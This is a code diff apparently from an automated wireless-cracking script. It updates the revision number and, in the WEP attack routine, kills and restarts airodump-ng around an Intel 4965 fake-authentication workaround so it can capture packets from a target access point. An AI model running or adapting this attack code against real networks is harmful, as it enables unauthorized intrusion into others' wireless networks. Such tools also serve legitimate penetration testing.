@@ -29,7 +29,7 @@ except ImportError:
 	print '[!] unable to import tkinter -- GUI disabled'
 
 # current revision
-REVISION=29
+REVISION=30
 
 # default wireless interface (blank to prompt)
 # ex: wlan0, wlan1, rausb0
@@ -1663,8 +1663,25 @@ def attack_wep_all(index):
 					if faked:
 						break
 			else:
+				print GR+'[+] '+R+'killing '+W+'airodump-ng'
+				# wpa_supplicant workaround requires airodump-ng be closed.
+				try:
+					os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
+				except OSError:
+					pass
+				except UnboundLocalError:
+					pass
+				subprocess.call(['killall','airodump-ng'], stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
+				time.sleep(0.5)
+				
 				print ''+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+O+'attempting intel 4965 workaround'+W
 				faked=attack_fakeauth_intel(index)
+				
+				print GR+'[+] '+R+'starting '+W+'airodump-ng'
+				# open airodump to capture packets
+				cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1], '--bssid',TARGETS[index][0], \
+						'--output-format','csv,ivs',IFACE]
+				proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 				
 			if faked:
 				# fake auth was successful
